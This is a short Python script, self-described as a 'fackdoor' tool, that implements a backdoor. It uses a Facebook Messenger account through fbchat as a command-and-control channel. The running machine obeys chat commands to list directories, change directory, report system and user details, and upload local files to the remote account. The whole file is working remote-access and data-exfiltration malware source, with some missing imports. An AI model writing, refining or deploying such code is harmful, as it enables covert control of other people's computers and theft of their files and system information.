import requests
import fbchat
import argparse
from fbchat.models import *
import os

banner =f"""
Welcome to the fackdoor tool
	--help to display  an overview over the tool
	-sa / --serveractname : attacker "fb" act name
	-sp / --serveractpwd : attacker "fb" act pwd
	-va / --victimactname: victim "fb" act name
"""

def connect_fb(sa,sp):
	client = fbchat.Client(sa,sp) 
	return client


def send_command(cl,va,com):
	friends = cl.searchForUsers(va)[0]	

	message_id = cl.send(fbchat.Message(text=com), thread_id=friends.uid, thread_type=ThreadType.USER)
	if message_id:
		print("Message sent successfully!")
def send_file(cl,va,file):
	friend = cl.searchForUsers(va)[0]	
	message_id=cl.sendLocalImage(
					file,
					message=Message(text=''),
					thread_id=friend.uid,
					thread_type=ThreadType.USER,
				    )
	if message_id: 
		print("Message sent successfully!")

def recv_resp(sa,sp,va,cl):
	friends = cl.searchForUsers(va)[0]
	cmd = cl.fetchThreadMessages(thread_id=friends.uid, limit=1)[0].text
	send_command(cl,va,'Send Valid Command [list,where,cd <dir>,sysinfo,download <file>,exit]')
	while 1:
		cmd = cl.fetchThreadMessages(thread_id=friends.uid, limit=1)[0].text
		if cmd == "list":
			send_command(cl,va,os.listdir(os.getcwd()))
	        
		elif cmd=="where":
			print(str(os.getcwd()).encode())
			send_command(cl,va,os.getcwd())
	        # Change directory
		elif cmd.split(" ")[0] == "cd":
			os.chdir(os.path.join(os.getcwd(),cmd.split(" ")[1]))
			send_command(cl,va,"Changed directory to {}".format(os.getcwd()))

	        # Get system info
		elif cmd == "sysinfo":
			sysinfo = f"""
	Operating System: {platform.system()}
	Computer Name: {platform.node()}
	Username: {getpass.getuser()}
	Release Version: {platform.release()}
	Processor Architecture: {platform.processor()}
	            """
			send_command(cl,va,sysinfo)

	        # Download files
		elif cmd.split(" ")[0] == "download":
			send_file(cl,va,cmd.split(' ')[1])
		elif cmd == "exit":
			send_command(cl,va,"stopping")
			break


def main():
	#cmd = ''
	#parser = argparse.ArgumentParser(description='Backdoor using FB')
	#parser.add_argument('-va','--serveractname',help="attacker 'fb' act name")
	#parser.add_argument('-vp','--serveractpwd',help="attacker 'fb' act pwd")
	#parser.add_argument('-aa','--victimactname',help="victim 'fb' act name")
	#print("Waiting.......")
	#args = parser.parse_args()
	with open('conf.txt','rb') as f:
		param = f.read().split(b'\n')

	print(param)
	sa =param[0].decode()
	sp = param[1].decode()
	va= param[2].decode()
	print(sa)
	cl = connect_fb(sa,sp)
	recv_resp(sa,sp,va,cl)

main()